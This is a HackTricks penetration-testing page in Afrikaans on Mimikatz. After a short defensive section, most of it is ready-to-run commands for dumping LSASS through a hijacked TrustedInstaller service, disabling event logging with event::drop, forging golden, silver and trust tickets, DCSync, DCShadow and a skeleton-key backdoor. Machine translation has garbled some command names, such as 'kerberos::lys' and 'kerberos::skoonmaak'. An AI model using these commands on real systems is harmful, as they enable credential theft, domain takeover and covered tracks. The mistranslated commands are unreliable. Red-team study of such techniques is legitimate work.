# Mimikatz

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersecurity-maatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of laai HackTricks af in PDF-formaat**? Kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Hierdie bladsy is gebaseer op een van [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Kyk na die oorspronklike vir verdere inligting!

## LM en duidelike teks in geheue

Vanaf Windows 8.1 en Windows Server 2012 R2 is beduidende maatreëls geïmplementeer om teen diefstal van geloofsbriewe te beskerm:

- **LM-hashes en duidelike teks wagwoorde** word nie meer in die geheue gestoor om sekuriteit te verbeter nie. 'n Spesifieke registerinstelling, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, moet gekonfigureer word met 'n DWORD-waarde van `0` om Digest-verifikasie uit te skakel, wat verseker dat "duidelike teks" wagwoorde nie in LSASS gekasheer word nie.

- **LSA-beskerming** word ingevoer om die Local Security Authority (LSA) proses teen ongemagtigde geheuelees en kode-inspuiting te beskerm. Dit word bereik deur die LSASS as 'n beskermde proses te merk. Aktivering van LSA-beskerming behels:
1. Wysig die register by _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ deur `RunAsPPL` in te stel as `dword:00000001`.
2. Implementering van 'n Groepbeleidsvoorwerp (GPO) wat hierdie registerverandering afdwing op bestuurde toestelle.

Ten spyte van hierdie beskermings kan gereedskap soos Mimikatz LSA-beskerming omseil deur spesifieke bestuurders te gebruik, alhoewel sulke aksies waarskynlik in gebeurtenislogboeke aangeteken sal word.

### Teenwerkende SeDebugPrivilege-verwydering

Administrateurs het tipies SeDebugPrivilege, wat hulle in staat stel om programme te ontleed. Hierdie voorreg kan beperk word om ongemagtigde geheue-afleidings te voorkom, 'n algemene tegniek wat deur aanvallers gebruik word om geloofsbriewe uit die geheue te onttrek. Selfs met hierdie voorreg verwyder, kan die TrustedInstaller-rekening steeds geheue-afleidings uitvoer deur 'n aangepaste dienskonfigurasie te gebruik:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Dit maak dit moontlik om die geheue van `lsass.exe` na 'n lêer te dump, wat dan op 'n ander stelsel geanaliseer kan word om geloofsbriewe te onttrek:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Opsies

Gebeurtenislog manipulasie in Mimikatz behels twee primêre aksies: die skoonmaak van gebeurtenislogs en die patching van die Gebeurtenisdiens om die log van nuwe gebeure te voorkom. Hieronder is die opdragte vir die uitvoering van hierdie aksies:

#### Skoonmaak van Gebeurtenislogs

- **Opdrag**: Hierdie aksie is daarop gemik om die gebeurtenislogs te verwyder, wat dit moeiliker maak om kwaadwillige aktiwiteite op te spoor.
- Mimikatz bied nie 'n direkte opdrag in sy standaard dokumentasie vir die skoonmaak van gebeurtenislogs direk via sy opdraglyn nie. Gebeurtenislog manipulasie behels egter gewoonlik die gebruik van stelselhulpmiddels of skripte buite Mimikatz om spesifieke logs te skoonmaak (bv. deur PowerShell of Windows Gebeurtenis Kyker te gebruik).

#### Eksperimentele Funksie: Patching van die Gebeurtenisdiens

- **Opdrag**: `event::drop`
- Hierdie eksperimentele opdrag is ontwerp om die gedrag van die Gebeurtenislogdiens te wysig, wat dit effektief verhoed dat nuwe gebeure aangeteken word.
- Voorbeeld: `mimikatz "privilege::debug" "event::drop" exit`

- Die `privilege::debug` opdrag verseker dat Mimikatz met die nodige bevoegdhede werk om stelseldienste te wysig.
- Die `event::drop` opdrag patch dan die Gebeurtenislogdiens.


### Kerberos Kaart Aanvalle

### Skepping van 'n Goue Kaart

'n Goue Kaart maak dit moontlik om domein-wye toegang na te boots. Sleutelopdrag en parameters:

- Opdrag: `kerberos::golden`
- Parameters:
- `/domain`: Die domeinnaam.
- `/sid`: Die domein se Sekuriteitsidentifiseerder (SID).
- `/user`: Die gebruikersnaam om na te boots.
- `/krbtgt`: Die NTLM-hash van die domein se KDC-diensrekening.
- `/ptt`: Spuit die kaart direk in die geheue in.
- `/ticket`: Stoor die kaart vir later gebruik.

Voorbeeld:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silwerkaart Skepping

Silwerkaarte verleen toegang tot spesifieke dienste. Sleutelopdrag en parameters:

- Opdrag: Soortgelyk aan 'n Goue Kaart, maar teiken spesifieke dienste.
- Parameters:
- `/service`: Die diens wat geteiken moet word (bv. cifs, http).
- Ander parameters soortgelyk aan 'n Goue Kaart.

Voorbeeld:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Vertroue-Tiket Skepping

Vertroue-tikette word gebruik om toegang tot hulpbronne oor domeine heen te verkry deur gebruik te maak van vertrouensverhoudings. Sleutelopdrag en parameters:

- Opdrag: Soortgelyk aan 'n Goue Tiket, maar vir vertrouensverhoudings.
- Parameters:
- `/target`: Die volledig gekwalifiseerde domeinnaam van die teiken-domein.
- `/rc4`: Die NTLM-hash vir die vertrouensrekening.

Voorbeeld:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Bykomende Kerberos-opdragte

- **Lys van Kaartjies**:
- Opdrag: `kerberos::lys`
- Lys alle Kerberos-kaartjies vir die huidige gebruikersessie.

- **Stuur die Cache**:
- Opdrag: `kerberos::ptc`
- Spuit Kerberos-kaartjies in vanaf cache-lêers.
- Voorbeeld: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Stuur die Kaartjie**:
- Opdrag: `kerberos::ptt`
- Maak dit moontlik om 'n Kerberos-kaartjie in 'n ander sessie te gebruik.
- Voorbeeld: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Skoonmaak van Kaartjies**:
- Opdrag: `kerberos::skoonmaak`
- Maak alle Kerberos-kaartjies skoon uit die sessie.
- Nuttig voordat kaartjie-manipulasie-opdragte gebruik word om konflikte te voorkom.


### Aktiewe Gids-versteuring

- **DCShadow**: Maak 'n masjien tydelik as 'n DC om AD-objekmanipulasie uit te voer.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Boots 'n DC na om wagwoorddata aan te vra.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Toegang tot Geldele

- **LSADUMP::LSA**: Haal geldele uit LSA.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Stel 'n DC voor deur 'n rekenaarrekening se wagwoorddata te gebruik.
- *Geen spesifieke opdrag vir NetSync in oorspronklike konteks verskaf nie.*

- **LSADUMP::SAM**: Kry toegang tot die plaaslike SAM-databasis.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Ontsleutel geheime wat in die register gestoor word.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Stel 'n nuwe NTLM-hash vir 'n gebruiker in.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Kry vertroue-verifikasie-inligting.
- `mimikatz "lsadump::trust" exit`

### Verskeidenhede

- **MISC::Skeleton**: Spuit 'n agterdeur in LSASS op 'n DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Bevoorregtingverhoging

- **PRIVILEGE::Backup**: Verkry rugsteunregte.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Verkry aflynregte.
- `mimikatz "privilege::debug" exit`

### Wagwoordopvraag

- **SEKURLSA::LogonPasswords**: Wys geldele vir aangemelde gebruikers.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Haal Kerberos-kaartjies uit die geheue.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid- en Tokenmanipulasie

- **SID::add/modify**: Verander SID en SIDHistory.
- Voeg by: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Wysig: *Geen spesifieke opdrag vir wysig in oorspronklike konteks verskaf nie.*

- **TOKEN::Elevate**: Stel tokens voor.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminaaldienste

- **TS::MultiRDP**: Laat verskeie RDP-sessies toe.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Lys TS/RDP-sessies.
- *Geen spesifieke opdrag vir TS::Sessions in oorspronklike konteks verskaf nie.*

### Kluis

- Haal wagwoorde uit Windows-kluis.
- `mimikatz "vault::cred /patch" exit`


<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersekuriteitsmaatskappy**? Wil jy jou **maatskappy adverteer in HackTricks**? Of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**SUBSKRIPSIEPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien vir die** [**hacktricks-repo**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud-repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
